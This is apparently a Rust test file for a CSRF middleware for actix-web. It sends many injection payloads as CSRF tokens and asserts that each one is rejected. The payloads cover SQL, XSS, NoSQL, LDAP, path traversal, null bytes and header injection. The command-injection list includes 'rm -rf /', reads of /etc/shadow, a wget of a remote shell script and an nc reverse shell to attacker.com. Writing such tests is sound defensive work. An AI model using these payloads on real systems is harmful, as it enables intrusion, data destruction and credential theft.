#[macro_use]
mod common;

use actix_csrf_middleware::{CsrfPattern, DEFAULT_CSRF_TOKEN_FIELD, DEFAULT_CSRF_TOKEN_HEADER};
use actix_web::{http::header::ContentType, http::StatusCode, test};
use serde_json::json;

use common::*;

fn get_secret_key() -> Vec<u8> {
    b"super-secret-super-secret-super-secret-xx".to_vec()
}

async fn case_sql_injection_in_csrf_token<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM sessions WHERE id = '1'; --",
        "' UNION SELECT * FROM users; --",
        "\"; DROP DATABASE csrf; --",
    ];

    for payload in payloads {
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_CSRF_TOKEN_HEADER, payload));
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_xss_injection_in_csrf_forms<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    ];

    for payload in payloads {
        // header
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_CSRF_TOKEN_HEADER, payload));
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);

        // form
        let form_data = format!("{DEFAULT_CSRF_TOKEN_FIELD}={payload}");
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .set_payload(form_data);
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_command_injection_in_csrf_token<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget malicious.com/shell.sh",
        "`whoami`",
        "$(cat /etc/shadow)",
        "; nc -e /bin/sh attacker.com 4444",
    ];

    for payload in payloads {
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_CSRF_TOKEN_HEADER, payload));
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_nosql_injection_in_json_csrf<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        json!({ "csrf_token": {"$ne": null} }),
        json!({ "csrf_token": {"$gt": ""} }),
        json!({ "csrf_token": {"$regex": ".*"} }),
        json!({ "csrf_token": {"$where": "function() { return true; }"} }),
    ];

    for payload in payloads {
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::json())
            .set_json(payload);
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_ldap_injection_in_csrf_token<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "*)(uid=*",
        "*)(|(uid=*))",
        "*))%00",
        "*)((|1=1)",
        "*)(mail=*)",
    ];

    for payload in payloads {
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_CSRF_TOKEN_HEADER, payload));
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_path_traversal_injection<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ];

    for payload in payloads {
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_CSRF_TOKEN_HEADER, payload));
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_null_byte_injection<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "valid_token\0.txt",
        "token\0\0.exe",
        "\0/etc/passwd",
        "csrf\0token",
    ];

    for payload in payloads {
        let form_data = format!("{DEFAULT_CSRF_TOKEN_FIELD}={payload}");
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .set_payload(form_data);
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

async fn case_header_injection_csrf<S>(pattern: CsrfPattern, app: &S)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<
            actix_http::body::EitherBody<actix_http::body::BoxBody>,
        >,
        Error = actix_web::Error,
    >,
{
    let (_token, cookies) = token_and_cookies_for(app, &pattern).await;
    let payloads = vec![
        "valid_token\r\nSet-Cookie: admin=true",
        "token\n\rLocation: http://malicious.com",
        "csrf\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
        "token\r\nX-Forwarded-For: 127.0.0.1",
    ];

    for payload in payloads {
        let form_data = format!("{DEFAULT_CSRF_TOKEN_FIELD}={payload}");
        let mut req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .set_payload(form_data);
        for c in cookies.clone() {
            req = req.cookie(c);
        }
        let resp = test::call_service(app, req.to_request()).await;
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }
}

for_patterns!(
    test_sql_injection_in_csrf_token_double,
    test_sql_injection_in_csrf_token_sync,
    case_sql_injection_in_csrf_token
);
for_patterns!(
    test_xss_injection_in_csrf_forms_double,
    test_xss_injection_in_csrf_forms_sync,
    case_xss_injection_in_csrf_forms
);
for_patterns!(
    test_command_injection_in_csrf_token_double,
    test_command_injection_in_csrf_token_sync,
    case_command_injection_in_csrf_token
);
for_patterns!(
    test_nosql_injection_in_json_csrf_double,
    test_nosql_injection_in_json_csrf_sync,
    case_nosql_injection_in_json_csrf
);
for_patterns!(
    test_ldap_injection_in_csrf_token_double,
    test_ldap_injection_in_csrf_token_sync,
    case_ldap_injection_in_csrf_token
);
for_patterns!(
    test_path_traversal_injection_double,
    test_path_traversal_injection_sync,
    case_path_traversal_injection
);
for_patterns!(
    test_null_byte_injection_double,
    test_null_byte_injection_sync,
    case_null_byte_injection
);
for_patterns!(
    test_header_injection_csrf_double,
    test_header_injection_csrf_sync,
    case_header_injection_csrf
);
